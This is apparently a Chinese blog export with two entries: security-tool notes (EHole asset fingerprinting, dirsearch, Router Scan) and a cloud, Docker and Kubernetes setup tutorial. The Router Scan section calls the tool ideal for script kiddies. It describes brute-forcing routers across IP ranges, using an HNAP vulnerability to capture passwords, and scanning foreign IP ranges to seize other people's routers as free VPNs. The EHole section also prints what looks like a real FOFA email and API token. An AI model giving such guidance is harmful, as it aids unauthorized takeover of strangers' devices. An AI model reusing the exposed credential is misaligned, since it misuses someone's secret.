E:\tools\collection\EHole_windows_amd64&gt;EHole_windows_amd64.exe finger -h从fofa或者本地文件获取资产进行指纹识别，支持单条url识别。Usage:  ehole finger [flags]Flags:  -f, --fip string      从fofa提取资产，进行指纹识别，仅仅支持ip或者ip段，例如：192.168.1.1 | 192.168.1.0/24  -s, --fofa string     从fofa提取资产，进行指纹识别，支持fofa所有语法  -h, --help            help for finger  -l, --local string    从本地文件读取资产，进行指纹识别，支持无协议，列如：192.168.1.1:9090 | http://192.168.1.1:9090  -o, --output string   输出所有结果，当前仅支持json和xlsx后缀的文件。  -p, --proxy string    指定访问目标时的代理，支持http代理和socks5，例如：http://127.0.0.1:8080、socks5://127.0.0.1:8080  -t, --thread int      指纹识别线程大小。 (default 100)  -u, --url string      识别单个目标。Global Flags:      --config string   config file (default is $HOME/.ehole.yaml)###############################################################################################E:\tools\collection\EHole_windows_amd64&gt;EHole_windows_amd64.exe fofaext -h从fofa api提取资产并保存成xlsx，支持大批量ip提取,支持fofa所有语法。Usage:  ehole fofaext [flags]Flags:  -s, --fofa string     从fofa提取资产，支持fofa所有语法，默认保存所有结果。  -h, --help            help for fofaext  -l, --ipfile string   从文本获取IP，在fofa搜索，支持大量ip，默认保存所有结果。  -o, --output string   指定输出文件名和位置，当前仅支持xlsx后缀的文件。 (default &quot;results.xlsx&quot;)Global Flags:      --config string   config file (default is $HOME/.ehole.yaml)

使用方法
#本地识别EHole_windows_amd64.exe finger  -l url.txt#url.txt文件格式：	http://192.168.100.1:10086/	https://192.168.100.1:10086/	#fofa识别（需要配置FOFA密钥以及邮箱信息，在config.ini内配置好密钥以及邮箱即可使用）Email=om2bg0rl5cgyxdxtj2nhybfedmgo@open_wechatFofa_token=7e067ef287ebdb200d523d181cd724bd#支持单ip或IP段EHole_windows_amd64.exe finger -f 192.168.1.1EHole_windows_amd64.exe finger -f 192.168.1.0/24#将结果输出到指定文件EHole_windows_amd64.exe -l url.txt -json export.json











dirsearch Web路径发现
dirsearch是一个基于python的命令行工具，用于暴力扫描页面结构，包括网页中的目录和文件。
项目地址：https://github.com/maurosoria/dirsearch
pip3 install -r requirements.txt        //安装依赖



使用方法：
python3 dirsearch.py -u https://targetpython3 dirsearch.py -e php,html,js -u https://targetpython3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist

参数信息：
-u URL 						指定URL目标-L URLLIST 					指定URL列表目标-e	EXTENSIONS				指定扩展列表-R RECURSIVE_LEVEL_MAX	 	最大递归级别（子目录）（默认值：1[仅限根目录+1目录]）-r							递归暴力-t	THREADSCOUNT			指定线程数-w	WORDLIST				指定自定义单词表


HTTP 405 “Method Not Allowed” 是一个客户端错误响应状态码，表示请求中指定的方法（如GET、POST、PUT等）对于目标资源来说是不允许的。

Router Scan路由器扫描RouterScan v2.51是我用过的路由器扫描软件中最容易使用，效果最好的，功能最全面的一个工具，成功率可以达到90%，非常适合新手和脚本小子使用。最为一款路由器安全测试工具，其最核心的功能当然还是在路由器扫描。

扫描模块功能：
   Router Scan(main)模块是新版本中默认选择运行的模块，要想做快速检测时，可以单独选择此功能模块就行，但是它的缺点就是，成功获取认证帐号和密码的概率会降低，因为很多路由器单靠暴力破解是行不通的。
   Detect proxy servers，从字面上意思是检测代理服务器，但是它的具体作用，我暂时还没弄清楚，还请高手出来指点一二。我想应该是扫描检测可以作为代理的主机，以方便架设属于自己的VPN吧。
   Use HNAP 1.0，使用HNAP协议里的漏洞对路由器进行安全检测。HANP是
Home Network Administration Protocol的缩写，即家庭网络管理协议。是一种基于 HTTP-SOAP 实现的网络管理协议，具有其它大多数网络管理协议的相同特征:远程认证登陆、远程配置、信息获取，配置执行生效等。这个协议允许设备厂商通过该协议对自己设备进行远程管理和配置，以方便更好得管理自己的设备，给消费者用户提供更好的技术支持。但是某些路由器厂商也因这个协议而爆出漏洞：HNAP命令远程权限提升漏洞。 这个扫描工具正是集合了该漏洞的POC，成功得提升了路由器爆破的成功率，选择该模块之后，一些字典里没有的密码也可以被直接捕获到！
   SQLite Manager RCE，利用SQLite Manager 远程连接设备中的数据库，进行配置信息的检索，以达到爆破的目的。
   Hudson Java Servlet. 此功能还没测试过，因此具体作用未知。一般用上面这几个功能，它的爆破成功率已经高达80%，比市面上的很多扫描器要好很多，可称之为神器！
使用案例1、路由器安全测试
1、设置软件参数，最大线程数使用默认的300就可以了，太高了会影响扫描成功率，建议在100-300之间，当然这也跟你的个人电脑的配置还有带宽等因素有关，如果配置带宽都很高，可以适当调高；设置超时时间，使用默认的2000就可以了；扫描端口：80、8080、1080；Scanning modules : Router Scan(main)，Use HNAP 1.0 ，就勾选这两个就足够了。最后再设置一个你想要测试的地址段，设置参数就完成了。如图：

案例二：动手制作自己的免费VPN，实现FQ功能
 1、设置还是跟上一个案例设置一样，唯一不同的是在设置IP地址段时，把IP地址段设置为国外的IP地址段，以扫描国外可用做自己VPN的路由器主机。国外的IP地址段可以利用百度，谷歌等搜索引擎进行收集；
  2、扫描出结果之后，就可以登录路由器，查看里面是否具有Dynamic DNS也就是动态DNS功能，如果有，则进行简单的设置就可以了。如图：
这个DDNS设置，需要你先到www.DynDNS.org这个网站上注册一个帐号及子域名才可用。配置好之后，点击应用。然后再配置一下我们电脑端的VPN连接。


 如图，VPN地址处填写我们在DynDDNS.org这个网站上申请的主机名称，用户名和密码就填写我们申请的就可以了。这样即使是路由器重启了，重新分配了不同的IP地址，我们也还是能够通过它进行VPN拨号连接！妈妈再也不用担心我访问不了Youtube了，oh yeah!
]]></content>
      <categories>
        <category>网络安全</category>
        <category>老男孩安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>老男孩安全</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-云原生技术</title>
    <url>/posts/1d2f039a.html</url>
    <content><![CDATA[云平台核心1、为什么用云平台

环境统一
按需付费
即开即用
稳定性强

国内常见云平台：

阿里云百度云，腾讯云、华为云、青云……

国外常见云平台：

亚马逊 AWS、微软 Azure …

1.公有云、

公有云是最常见的云计算部署类型。公有云资源（例如服务器和存储空间）由第三方云服务提供商拥有和运营，这些资源通过 Internet 提供。在公有云中，所有硬件、软件和其他支持性基础结构均为云提供商所拥有和管理。Microsoft Azure 是公有云的一个示例。
在公有云中，你与其他组织或云“租户”共享相同的硬件、存储和网络设备，并且你可以使用 Web 浏览器访问服务和管理帐户。公有云部署通常用于提供基于 Web 的电子邮件、网上办公应用、存储以及测试和开发环境。
公有云优势：

成本更低：无需购买硬件或软件，仅对使用的服务付费。

无需维护：维护由服务提供商提供。

近乎无限制的缩放性：提供按需资源，可满足业务需求。

高可靠性：具备众多服务器，确保免受故障影响。

可用性： N个9   9   全年的故障时间： 365243600*(1-99.9999%）


2.私有云

私有云由专供一个企业或组织使用的云计算资源构成。私有云可在物理上位于组织的现场数据中心，也可由第三方服务提供商托管。但是，在私有云中，服务和基础结构始终在私有网络上进行维护，硬件和软件专供组织使用。
这样，私有云可使组织更加方便地自定义资源，从而满足特定的 IT 需求。私有云的使用对象通常为政府机构、金融机构以及其他具备业务关键性运营且希望对环境拥有更大控制权的中型到大型组织。
私有云优势：

灵活性更强：组织可自定义云环境以满足特定业务需求。
控制力更强：资源不与其他组织共享，因此能获得更高的控制力以及更高的隐私级别。
可伸缩性更强：与本地基础结构相比，私有云通常具有更强的可伸缩性。

没有一种云计算类型适用于所有人。多种不同的云计算模型、类型和服务已得到发展，可以满足组织快速变化的技术需求。
部署云计算资源有三种不同的方法：公共云、私有云和混合云。采用的部署方法取决于业务需求。
3.核心架构①所需软件
electerm：  https://electerm.github.io/electerm/
（https://wwa.lanzoui.com/b016k9bha
密码:900h）
  注册云平台

阿里云   aliyun.com 
腾讯云   cloud.tencent.com
华为云   cloud.huawei.com

青云       qingcloud.com
百度云    cloud.baidu.com
4.基础概念
云服务器作为应用的最终载体
VPC为所有云服务器提供网络隔离
所有云服务器都是绑定某个私有网络
安全组控制每个服务器的防火墙规则
公网IP使得资源可访问
端口转发的方式访问到具体服务器

Docker基础Docker基本概念一.解决的问题1.统一标准

应用构建 


Java、C++、JavaScript
打成软件包
.exe
docker build ….   镜像


应用分享


所有软件的镜像放到一个指定地方  docker hub
安卓，应用市场


应用运行


统一标准的 镜像
docker run


…….


2.资源隔离

cpu、memory资源隔离与限制
访问设备隔离与限制
网络隔离与限制
用户、用户组隔离限制

二.架构

Docker_Host：


安装Docker的主机


Docker Daemon：


运行在Docker主机上的Docker后台进程


Client：


操作Docker主机的客户端（命令行、UI等）


Registry：


镜像仓库
Docker Hub


Images：


镜像，带环境打包好的程序，可以直接启动运行


Containers：


容器，由镜像启动起来正在运行中的程序



交互逻辑
装好Docker，然后去 软件市场 寻找镜像，下载并运行，查看容器状态日志等排错

三.安装1、centos下安装docker文档
https://docs.docker.com/engine/install/centos/
①移除以前docker相关包sudo yum remove docker \                  docker-client \                  docker-client-latest \                  docker-common \                  docker-latest \                  docker-latest-logrotate \                  docker-logrotate \                  docker-engine



②配置yum源sudo yum install -y yum-utilssudo yum-config-manager \--add-repo \http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo

③安装dockersudo yum install -y docker-ce docker-ce-cli containerd.io#以下是在安装k8s的时候使用yum install -y docker-ce-20.10.7 docker-ce-cli-20.10.7  containerd.io-1.4.6

④启动systemctl enable docker --now

⑤配置加速这里额外添加了docker的生产环境核心配置cgroup
sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;&#123;  &quot;registry-mirrors&quot;: [&quot;https://82m9ar63.mirror.aliyuncs.com&quot;],  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],  &quot;log-driver&quot;: &quot;json-file&quot;,  &quot;log-opts&quot;: &#123;    &quot;max-size&quot;: &quot;100m&quot;  &#125;,  &quot;storage-driver&quot;: &quot;overlay2&quot;&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker

Docker命令实战常用命令

基础实战①找镜像去docker hub，找到nginx镜像
docker pull nginx  #下载最新版镜像名:版本名（标签）docker pull nginx:1.20.1docker pull redis  #下载最新docker pull redis:6.2.4## 下载来的镜像都在本地docker images  #查看所有镜像redis = redis:latestdocker rmi 镜像名:版本号/镜像id

②启动容器启动nginx应用容器，并映射88端口，测试的访问
docker run [OPTIONS] IMAGE [COMMAND] [ARG...]【docker run  设置项   镜像名  】 镜像启动运行的命令（镜像里面默认有的，一般不会写）# -d：后台运行# --restart=always: 开机自启docker run --name=mynginx   -d  --restart=always -p  88:80   nginx# 查看正在运行的容器docker ps# 查看所有docker ps -a# 删除停止的容器docker rm  容器id/名字docker rm -f mynginx   #强制删除正在运行中的#停止容器docker stop 容器id/名字#再次启动docker start 容器id/名字#应用开机自启docker update 容器id/名字 --restart=always

③修改容器内容修改默认的index.html 页面
Ⅰ.进入容器内部修改# 进入容器内部的系统，修改容器内容docker exec -it 容器id  /bin/bash

Ⅱ.挂在数据到外部修改docker run --name=mynginx   \-d  --restart=always \-p  88:80 -v /data/html:/usr/share/nginx/html:ro  \nginx# 修改页面只需要去 主机的 /data/html

④提交改变将自己修改好的镜像提交
docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]docker commit -a &quot;leifengyang&quot;  -m &quot;首页变化&quot; 341d81f7504f guignginx:v1.0

Ⅰ镜像传输# 将镜像保存成压缩包docker save -o abc.tar guignginx:v1.0# 别的机器加载这个镜像docker load -i abc.tar# 离线安装

⑤推送远程仓库推送镜像到docker hub；应用市场
docker tag local-image:tagname new-repo:tagnamedocker push new-repo:tagname

# 把旧镜像的名字，改成仓库要求的新版名字docker tag guignginx:v1.0 leifengyang/guignginx:v1.0# 登录到docker hubdocker login       docker logout（推送完成镜像后退出）# 推送docker push leifengyang/guignginx:v1.0# 别的机器下载docker pull leifengyang/guignginx:v1.0

⑥补充docker logs 容器名/id   排错docker exec -it 容器id /bin/bash# docker 经常修改nginx配置文件docker run -d -p 80:80 \-v /data/html:/usr/share/nginx/html:ro \-v /data/conf/nginx.conf:/etc/nginx/nginx.conf \--name mynginx-02 \nginx#把容器指定位置的东西复制出来 docker cp 5eff66eec7e1:/etc/nginx/nginx.conf  /data/conf/nginx.conf#把外面的内容复制到容器里面docker cp  /data/conf/nginx.conf  5eff66eec7e1:/etc/nginx/nginx.conf

进阶实战①编写自己的应用java-demo.jar
②将应用打包成镜像编写Dockerfile将自己的应用打包镜像
Ⅰ以前java为例

SpringBoot打包成可执行jar
把jar包上传给服务
服务器运行java -jar

Ⅱ现在所有机器都安装Docker，任何应用都是镜像，所有机器都可以运行
Ⅲ如何打包FROM openjdk:8-jdk-slimLABEL maintainer=leifengyangCOPY target/*.jar   /app.jarENTRYPOINT [&quot;java&quot;,&quot;-jar&quot;,&quot;/app.jar&quot;]



docker build -t java-demo:v1.0 .

思考： 每个应用每次打包，都需要本地编译、再上传服务器、再进行docker构建，如果有1000个应用要打包镜像怎么办？有没有更好的方式？
③启动容器启动容器
docker run -d -p 8080:8080 --name myjava-app java-demo:v1.0 

分享镜像
# 登录docker hubdocker login#给旧镜像起名docker tag java-demo:v1.0  leifengyang/java-demo:v1.0# 推送到docker hubdocker push leifengyang/java-demo:v1.0# 别的机器docker pull leifengyang/java-demo:v1.0# 别的机器运行docker run -d -p 8080:8080 --name myjava-app java-demo:v1.0 

④部署中间件
部署一个Redis+应用，尝试应用操作Redis产生数据
docker run [OPTIONS] IMAGE [COMMAND] [ARG...]#redis使用自定义配置文件启动docker run -v /data/redis/redis.conf:/etc/redis/redis.conf \-v /data/redis/data:/data \-d --name myredis \-p 6379:6379 \redis:latest  redis-server /etc/redis/redis.conf

Kubernetes实战入门Kubernetes基础概念一.是什么
我们急需一个大规模容器编排系统
kubernetes具有以下特性：

服务发现和负载均衡Kubernetes 可以使用 DNS 名称或自己的 IP 地址公开容器，如果进入容器的流量很大， Kubernetes 可以负载均衡并分配网络流量，从而使部署稳定。
存储编排Kubernetes 允许你自动挂载你选择的存储系统，例如本地存储、公共云提供商等。
自动部署和回滚你可以使用 Kubernetes 描述已部署容器的所需状态，它可以以受控的速率将实际状态 更改为期望状态。例如，你可以自动化 Kubernetes 来为你的部署创建新容器， 删除现有容器并将它们的所有资源用于新容器。
自动完成装箱计算Kubernetes 允许你指定每个容器所需 CPU 和内存（RAM）。 当容器指定了资源请求时，Kubernetes 可以做出更好的决策来管理容器的资源。
自我修复Kubernetes 重新启动失败的容器、替换容器、杀死不响应用户定义的 运行状况检查的容器，并且在准备好服务之前不将其通告给客户端。
密钥与配置管理Kubernetes 允许你存储和管理敏感信息，例如密码、OAuth 令牌和 ssh 密钥。 你可以在不重建容器镜像的情况下部署和更新密钥和应用程序配置，也无需在堆栈配置中暴露密钥。

*Kubernetes 为你提供了一个可弹性运行分布式系统的框架。 Kubernetes 会满足你的扩展要求、故障转移、部署模式等。 例如，Kubernetes 可以轻松管理系统的 Canary 部署。*
二.架构1.工作方式Kubernetes Cluster &#x3D; N Master Node + N Worker Node：N主节点+N工作节点； N&gt;&#x3D;1
2.组件架构
①控制平面组件（Control Plane Components）控制平面的组件对集群做出全局决策(比如调度)，以及检测和响应集群事件（例如，当不满足部署的 replicas 字段时，启动新的 pod）。
控制平面组件可以在集群中的任何节点上运行。 然而，为了简单起见，设置脚本通常会在同一个计算机上启动所有控制平面组件， 并且不会在此计算机上运行用户容器。 请参阅使用 kubeadm 构建高可用性集群 中关于多 VM 控制平面设置的示例。
kube-apiserverAPI 服务器是 Kubernetes 控制面的组件， 该组件公开了 Kubernetes API。 API 服务器是 Kubernetes 控制面的前端。
Kubernetes API 服务器的主要实现是 kube-apiserver。 kube-apiserver 设计上考虑了水平伸缩，也就是说，它可通过部署多个实例进行伸缩。 你可以运行 kube-apiserver 的多个实例，并在这些实例之间平衡流量。
etcdetcd 是兼具一致性和高可用性的键值数据库，可以作为保存 Kubernetes 所有集群数据的后台数据库。
您的 Kubernetes 集群的 etcd 数据库通常需要有个备份计划。
要了解 etcd 更深层次的信息，请参考 etcd 文档。
kube-scheduler控制平面组件，负责监视新创建的、未指定运行节点（node）的 Pods，选择节点让 Pod 在上面运行。
调度决策考虑的因素包括单个 Pod 和 Pod 集合的资源需求、硬件&#x2F;软件&#x2F;策略约束、亲和性和反亲和性规范、数据位置、工作负载间的干扰和最后时限。
kube-controller-manager在主节点上运行 控制器 的组件。
从逻辑上讲，每个控制器都是一个单独的进程， 但是为了降低复杂性，它们都被编译到同一个可执行文件，并在一个进程中运行。
这些控制器包括:

节点控制器（Node Controller）: 负责在节点出现故障时进行通知和响应
任务控制器（Job controller）: 监测代表一次性任务的 Job 对象，然后创建 Pods 来运行这些任务直至完成
端点控制器（Endpoints Controller）: 填充端点(Endpoints)对象(即加入 Service 与 Pod)
服务帐户和令牌控制器（Service Account &amp; Token Controllers）: 为新的命名空间创建默认帐户和 API 访问令牌

cloud-controller-manager云控制器管理器是指嵌入特定云的控制逻辑的 控制平面组件。 云控制器管理器允许您链接集群到云提供商的应用编程接口中， 并把和该云平台交互的组件与只和您的集群交互的组件分离开。
cloud-controller-manager 仅运行特定于云平台的控制回路。 如果你在自己的环境中运行 Kubernetes，或者在本地计算机中运行学习环境， 所部署的环境中不需要云控制器管理器。
与 kube-controller-manager 类似，cloud-controller-manager 将若干逻辑上独立的 控制回路组合到同一个可执行文件中，供你以同一进程的方式运行。 你可以对其执行水平扩容（运行不止一个副本）以提升性能或者增强容错能力。
下面的控制器都包含对云平台驱动的依赖：

节点控制器（Node Controller）: 用于在节点终止响应后检查云提供商以确定节点是否已被删除
路由控制器（Route Controller）: 用于在底层云基础架构中设置路由
服务控制器（Service Controller）: 用于创建、更新和删除云提供商负载均衡器

②Node 组件节点组件在每个节点上运行，维护运行的 Pod 并提供 Kubernetes 运行环境。
kubelet一个在集群中每个节点（node）上运行的代理。 它保证容器（containers）都 运行在 Pod 中。
kubelet 接收一组通过各类机制提供给它的 PodSpecs，确保这些 PodSpecs 中描述的容器处于运行状态且健康。 kubelet 不会管理不是由 Kubernetes 创建的容器。
kube-proxykube-proxy 是集群中每个节点上运行的网络代理， 实现 Kubernetes 服务（Service） 概念的一部分。
kube-proxy 维护节点上的网络规则。这些网络规则允许从集群内部或外部的网络会话与 Pod 进行网络通信。
如果操作系统提供了数据包过滤层并可用的话，kube-proxy 会通过它来实现网络规则。否则， kube-proxy 仅转发流量本身。

三.kubeadm创建集群请参照以前Docker安装，先提前为所有机器安装Docker
1.安装kubeadm
一台兼容的 Linux 主机。Kubernetes 项目为基于 Debian 和 Red Hat 的 Linux 发行版以及一些不提供包管理器的发行版提供通用的指令

每台机器 2 GB 或更多的 RAM （如果少于这个数字将会影响你应用的运行内存)

2 CPU 核或更多

集群中的所有机器的网络彼此均能相互连接(公网和内网都可以)


设置防火墙放行规则


节点之中不可以有重复的主机名、MAC 地址或 product_uuid。请参见这里了解更多详细信息。


设置不同hostname


开启机器上的某些端口。请参见这里 了解更多详细信息。


内网互信


禁用交换分区。为了保证 kubelet 正常工作，你 必须 禁用交换分区。


永久关闭



①基础环境所有机器执行以下操作
#各个机器设置自己的域名hostnamectl set-hostname xxxx# 将 SELinux 设置为 permissive 模式（相当于将其禁用）sudo setenforce 0sudo sed -i &#x27;s/^SELINUX=enforcing$/SELINUX=permissive/&#x27; /etc/selinux/config#关闭swapswapoff -a  sed -ri &#x27;s/.*swap.*/#&amp;/&#x27; /etc/fstab#允许 iptables 检查桥接流量cat &lt;&lt;EOF | sudo tee /etc/modules-load.d/k8s.confbr_netfilterEOFcat &lt;&lt;EOF | sudo tee /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1EOFsudo sysctl --system

2.安装kubelet,kubeadm,kubectlcat &lt;&lt;EOF | sudo tee /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64enabled=1gpgcheck=0repo_gpgcheck=0gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg   http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgexclude=kubelet kubeadm kubectlEOFsudo yum install -y kubelet-1.20.9 kubeadm-1.20.9 kubectl-1.20.9 --disableexcludes=kubernetessudo systemctl enable --now kubelet

2.使用kubeadm引导集群①下载各个机器所需要的镜像sudo tee ./images.sh &lt;&lt;-&#x27;EOF&#x27;#!/bin/bashimages=(kube-apiserver:v1.20.9kube-proxy:v1.20.9kube-controller-manager:v1.20.9kube-scheduler:v1.20.9coredns:1.7.0etcd:3.4.13-0pause:3.2)for imageName in $&#123;images[@]&#125; ; dodocker pull registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/$imageNamedoneEOF   chmod +x ./images.sh &amp;&amp; ./images.sh

②初始化主节点#所有机器添加master域名映射，以下需要修改为自己的echo &quot;172.31.0.4  cluster-endpoint&quot; &gt;&gt; /etc/hosts#主节点初始化kubeadm init \--apiserver-advertise-address=172.31.0.4 \--control-plane-endpoint=cluster-endpoint \--image-repository registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images \--kubernetes-version v1.20.9 \--service-cidr=10.96.0.0/16 \--pod-network-cidr=192.168.0.0/16#所有网络范围不重叠

Your Kubernetes control-plane has initialized successfully!To start using your cluster, you need to run the following as a regular user:  mkdir -p $HOME/.kube  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config  sudo chown $(id -u):$(id -g) $HOME/.kube/configAlternatively, if you are the root user, you can run:  export KUBECONFIG=/etc/kubernetes/admin.confYou should now deploy a pod network to the cluster.Run &quot;kubectl apply -f [podnetwork].yaml&quot; with one of the options listed at:  https://kubernetes.io/docs/concepts/cluster-administration/addons/You can now join any number of control-plane nodes by copying certificate authoritiesand service account keys on each node and then running the following as root:  kubeadm join cluster-endpoint:6443 --token hums8f.vyx71prsg74ofce7 \    --discovery-token-ca-cert-hash sha256:a394d059dd51d68bb007a532a037d0a477131480ae95f75840c461e85e2c6ae3 \    --control-plane Then you can join any number of worker nodes by running the following on each as root:kubeadm join cluster-endpoint:6443 --token hums8f.vyx71prsg74ofce7 \    --discovery-token-ca-cert-hash sha256:a394d059dd51d68bb007a532a037d0a477131480ae95f75840c461e85e2c6ae3

#查看集群所有节点kubectl get nodes#根据配置文件，给集群创建资源kubectl apply -f xxxx.yaml#查看集群部署了哪些应用？docker ps   ===   kubectl get pods -A# 运行中的应用在docker里面叫容器，在k8s里面叫Podkubectl get pods -A

③根据提示继续master成功后提示如下

Ⅰ设置.kube&#x2F;config复制上边命令
Ⅱ安装网络组件
calico官网
curl https://docs.projectcalico.org/manifests/calico.yaml -Okubectl apply -f calico.yaml

④加入node节点kubeadm join cluster-endpoint:6443 --token x5g4uy.wpjjdbgra92s25pp \	--discovery-token-ca-cert-hash sha256:6255797916eaee52bf9dda9429db616fcd828436708345a308f4b917d3457a22

新令牌
kubeadm token create --print-join-command
高可用部署方式，也是在这一步的时候，使用添加主节点的命令即可
⑤验证集群
验证集群节点状态


kubectl get nodes



⑥部署dashboardⅠ部署kubernetes官方提供的可视化界面
https://github.com/kubernetes/dashboard
kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.3.1/aio/deploy/recommended.yaml

# Copyright 2017 The Kubernetes Authors.## Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);# you may not use this file except in compliance with the License.# You may obtain a copy of the License at##     http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an &quot;AS IS&quot; BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.apiVersion: v1kind: Namespacemetadata:  name: kubernetes-dashboard---apiVersion: v1kind: ServiceAccountmetadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard  namespace: kubernetes-dashboard---kind: ServiceapiVersion: v1metadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard  namespace: kubernetes-dashboardspec:  ports:    - port: 443      targetPort: 8443  selector:    k8s-app: kubernetes-dashboard---apiVersion: v1kind: Secretmetadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard-certs  namespace: kubernetes-dashboardtype: Opaque---apiVersion: v1kind: Secretmetadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard-csrf  namespace: kubernetes-dashboardtype: Opaquedata:  csrf: &quot;&quot;---apiVersion: v1kind: Secretmetadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard-key-holder  namespace: kubernetes-dashboardtype: Opaque---kind: ConfigMapapiVersion: v1metadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard-settings  namespace: kubernetes-dashboard---kind: RoleapiVersion: rbac.authorization.k8s.io/v1metadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard  namespace: kubernetes-dashboardrules:  # Allow Dashboard to get, update and delete Dashboard exclusive secrets.  - apiGroups: [&quot;&quot;]    resources: [&quot;secrets&quot;]    resourceNames: [&quot;kubernetes-dashboard-key-holder&quot;, &quot;kubernetes-dashboard-certs&quot;, &quot;kubernetes-dashboard-csrf&quot;]    verbs: [&quot;get&quot;, &quot;update&quot;, &quot;delete&quot;]    # Allow Dashboard to get and update &#x27;kubernetes-dashboard-settings&#x27; config map.  - apiGroups: [&quot;&quot;]    resources: [&quot;configmaps&quot;]    resourceNames: [&quot;kubernetes-dashboard-settings&quot;]    verbs: [&quot;get&quot;, &quot;update&quot;]    # Allow Dashboard to get metrics.  - apiGroups: [&quot;&quot;]    resources: [&quot;services&quot;]    resourceNames: [&quot;heapster&quot;, &quot;dashboard-metrics-scraper&quot;]    verbs: [&quot;proxy&quot;]  - apiGroups: [&quot;&quot;]    resources: [&quot;services/proxy&quot;]    resourceNames: [&quot;heapster&quot;, &quot;http:heapster:&quot;, &quot;https:heapster:&quot;, &quot;dashboard-metrics-scraper&quot;, &quot;http:dashboard-metrics-scraper&quot;]    verbs: [&quot;get&quot;]---kind: ClusterRoleapiVersion: rbac.authorization.k8s.io/v1metadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboardrules:  # Allow Metrics Scraper to get metrics from the Metrics server  - apiGroups: [&quot;metrics.k8s.io&quot;]    resources: [&quot;pods&quot;, &quot;nodes&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]---apiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard  namespace: kubernetes-dashboardroleRef:  apiGroup: rbac.authorization.k8s.io  kind: Role  name: kubernetes-dashboardsubjects:  - kind: ServiceAccount    name: kubernetes-dashboard    namespace: kubernetes-dashboard---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata:  name: kubernetes-dashboardroleRef:  apiGroup: rbac.authorization.k8s.io  kind: ClusterRole  name: kubernetes-dashboardsubjects:  - kind: ServiceAccount    name: kubernetes-dashboard    namespace: kubernetes-dashboard---kind: DeploymentapiVersion: apps/v1metadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard  namespace: kubernetes-dashboardspec:  replicas: 1  revisionHistoryLimit: 10  selector:    matchLabels:      k8s-app: kubernetes-dashboard  template:    metadata:      labels:        k8s-app: kubernetes-dashboard    spec:      containers:        - name: kubernetes-dashboard          image: kubernetesui/dashboard:v2.3.1          imagePullPolicy: Always          ports:            - containerPort: 8443              protocol: TCP          args:            - --auto-generate-certificates            - --namespace=kubernetes-dashboard            # Uncomment the following line to manually specify Kubernetes API server Host            # If not specified, Dashboard will attempt to auto discover the API server and connect            # to it. Uncomment only if the default does not work.            # - --apiserver-host=http://my-address:port          volumeMounts:            - name: kubernetes-dashboard-certs              mountPath: /certs              # Create on-disk volume to store exec logs            - mountPath: /tmp              name: tmp-volume          livenessProbe:            httpGet:              scheme: HTTPS              path: /              port: 8443            initialDelaySeconds: 30            timeoutSeconds: 30          securityContext:            allowPrivilegeEscalation: false            readOnlyRootFilesystem: true            runAsUser: 1001            runAsGroup: 2001      volumes:        - name: kubernetes-dashboard-certs          secret:            secretName: kubernetes-dashboard-certs        - name: tmp-volume          emptyDir: &#123;&#125;      serviceAccountName: kubernetes-dashboard      nodeSelector:        &quot;kubernetes.io/os&quot;: linux      # Comment the following tolerations if Dashboard must not be deployed on master      tolerations:        - key: node-role.kubernetes.io/master          effect: NoSchedule---kind: ServiceapiVersion: v1metadata:  labels:    k8s-app: dashboard-metrics-scraper  name: dashboard-metrics-scraper  namespace: kubernetes-dashboardspec:  ports:    - port: 8000      targetPort: 8000  selector:    k8s-app: dashboard-metrics-scraper---kind: DeploymentapiVersion: apps/v1metadata:  labels:    k8s-app: dashboard-metrics-scraper  name: dashboard-metrics-scraper  namespace: kubernetes-dashboardspec:  replicas: 1  revisionHistoryLimit: 10  selector:    matchLabels:      k8s-app: dashboard-metrics-scraper  template:    metadata:      labels:        k8s-app: dashboard-metrics-scraper      annotations:        seccomp.security.alpha.kubernetes.io/pod: &#x27;runtime/default&#x27;    spec:      containers:        - name: dashboard-metrics-scraper          image: kubernetesui/metrics-scraper:v1.0.6          ports:            - containerPort: 8000              protocol: TCP          livenessProbe:            httpGet:              scheme: HTTP              path: /              port: 8000            initialDelaySeconds: 30            timeoutSeconds: 30          volumeMounts:          - mountPath: /tmp            name: tmp-volume          securityContext:            allowPrivilegeEscalation: false            readOnlyRootFilesystem: true            runAsUser: 1001            runAsGroup: 2001      serviceAccountName: kubernetes-dashboard      nodeSelector:        &quot;kubernetes.io/os&quot;: linux      # Comment the following tolerations if Dashboard must not be deployed on master      tolerations:        - key: node-role.kubernetes.io/master          effect: 